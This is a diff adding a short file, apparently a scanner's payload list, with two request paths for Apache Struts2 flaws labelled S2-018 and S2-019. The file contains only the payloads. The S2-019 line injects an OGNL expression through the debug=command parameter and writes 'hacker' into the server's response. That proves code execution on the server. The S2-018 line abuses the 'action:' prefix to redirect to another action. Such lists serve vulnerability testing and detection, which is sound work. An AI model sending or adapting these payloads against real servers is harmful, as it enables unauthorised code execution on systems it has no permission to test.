@@ -1,0 +1,5 @@
+S2-018
+/aaaaa.action?action:test!execute
+
+S2-019
+/test.action?debug=command&expression=%23p%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter()%2c%23p.println(%22hacker%22)%2c%23p.close()
